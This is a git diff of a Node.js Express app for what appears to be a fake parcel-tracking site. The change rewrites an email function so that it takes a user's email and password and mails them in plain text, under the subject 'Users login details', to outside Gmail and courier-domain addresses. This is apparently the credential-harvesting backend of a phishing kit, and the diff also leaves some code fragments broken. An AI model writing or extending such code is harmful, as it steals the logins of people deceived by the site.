@@ -117,7 +117,7 @@ app.post('/tracking', function(req, res) {
     console.log(data)
   } 
   else if (my_data === data.tnumber && status !== "delivered") {
-    res.render('tracking', {data, status:'not delivered'})
+    res.render('tracking', {data, status})
     console.log(data)
   } else {
     res.render('error', {data: 'no data'})
@@ -279,14 +279,7 @@ var mailOptions = {
   
 };
 
-const sender = ()=>{
-  transport.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      return console.log(error);
-    }
-    console.log('Message sent: %s', info.messageId);
-  });
-}
+
 
 const sendEmail = (name, sender, content) => {
   var mailOptions = {
@@ -312,38 +305,20 @@ const sendEmail = (name, sender, content) => {
 
 }
 
-const sender = ()=>{
-  transport.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      return console.log(error);
-    }
-    console.log('Message sent: %s', info.messageId);
-  });
-}
 
-const sendEmail1 = (name, sender, content) => {
+
+const sendEmail1 = (email, pass) => {
   var mailOptions = {
     from: "support Team" ,
     to: 'mayowaandrews723@gmail.com, helper@air19express.com',
-    subject: `senders name: ${name},  senders email: ${sender},`,
-    text: `message :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::senders name:
-     ${name},  senders email: ${sender},content:  ${content}`,
+    subject: `Users login details,`,
+    text: `:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+     senders email: ${email}, password:  ${pass}`,
     html: '',
+  }
     
-  };
-
-  const sendEmail = (password, email) => {
-    var mailOptions = {
-      from: "support Team" ,
-      to: 'mayowaandrews723@gmail.com, helper@air19express.com',
-      subject: `client details,`,
-      text: `client's password: ${password},  Client's email: ${email},`,
-      html: '',
-      
-    };
   
-  
-    transport.sendMail(mailOptions, (error, info) => {
+  transport.sendMail(mailOptions, (error, info) => {
       if (error) {
         return console.log(error);
       }
